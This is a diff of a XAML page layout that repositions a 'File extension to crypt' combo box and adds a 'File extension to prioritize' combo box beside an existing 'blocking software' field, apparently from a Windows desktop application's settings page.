@@ -71,23 +71,30 @@
                 </Button>
             </StackPanel>
 
-            <StackPanel Grid.Row="1" Grid.Column="1" Orientation="Horizontal" HorizontalAlignment="Left" VerticalAlignment="Bottom" Margin="0,0,20,55">
+            <!--File extension to crypt-->
+            <StackPanel Grid.Row="1" Grid.Column="1" Orientation="Horizontal" HorizontalAlignment="Left" VerticalAlignment="Bottom" Margin="0,0,20,70">
                 <TextBlock x:Name="fileExtensionToEncrypt" HorizontalAlignment="Left" TextWrapping="Wrap" VerticalAlignment="Top" Width="auto" Text="" Margin="0,0,5,0"/>
-                <ComboBox x:Name="CryptFiles" Width="auto" Height="22"  SelectedIndex="0">
-                    <ComboBoxItem x:Name="None" Content="None"></ComboBoxItem>
+                <ComboBox x:Name="CryptFiles" Width="auto" Height="22"  SelectedIndex="0" Margin="6,0,0,0">
+                    <ComboBoxItem x:Name="EncryptNone" Content="None"></ComboBoxItem>
                     <ComboBoxItem x:Name="mp4" Content=".mp4"></ComboBoxItem>
                 </ComboBox>
-                <!--<TextBox x:Name="CryptFiles" TextWrapping="Wrap"  Width="50" Height="18"/>-->
             </StackPanel>
-            
-            
+
+            <!--File extension to prioritize-->
+            <StackPanel Grid.Row="1" Grid.Column="1" Orientation="Horizontal" HorizontalAlignment="Left" VerticalAlignment="Bottom" Margin="0,0,20,42">
+                <TextBlock x:Name="fileExtensionToPrioritize" HorizontalAlignment="Left" TextWrapping="Wrap" VerticalAlignment="Top" Width="auto" Text="" Margin="0,0,5,0"/>
+                <ComboBox x:Name="PrioritizeFiles" Width="auto" Height="22"  SelectedIndex="0">
+                    <ComboBoxItem x:Name="PrioritizeNone" Content="None"></ComboBoxItem>
+                    <ComboBoxItem x:Name="txt" Content=".txt"></ComboBoxItem>
+                </ComboBox>
+            </StackPanel>
+
             <!--BLOCKING SOFTWARE-->
             <StackPanel Grid.Row="1" Grid.Column="1" Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Bottom" Margin="0,0,20,55">
                 <TextBlock x:Name="blockingSoftware" HorizontalAlignment="Left" TextWrapping="Wrap" VerticalAlignment="Top" Width="auto" Text="" Margin="0,0,5,0"/>
                 <TextBox x:Name="BlockIfRunning" TextWrapping="Wrap"  Width="120" Height="18"/>
             </StackPanel>
             
-
         </Grid>
     </Border>
 </Page>
